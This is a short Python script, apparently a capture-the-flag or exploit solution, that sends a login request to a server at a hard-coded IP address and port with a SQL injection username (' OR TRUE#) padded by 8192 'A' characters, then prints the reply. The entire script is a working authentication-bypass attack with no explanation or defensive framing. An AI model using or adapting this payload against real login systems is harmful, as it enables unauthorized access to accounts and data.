import json
import requests

with requests.post(
    "http://20.115.83.90:1339/",
    data={
        "login-submit": "",
        "username": f"' OR TRUE#{'A' * 8192}",
        "password": "password",
    },
) as req:
    print(req.content)
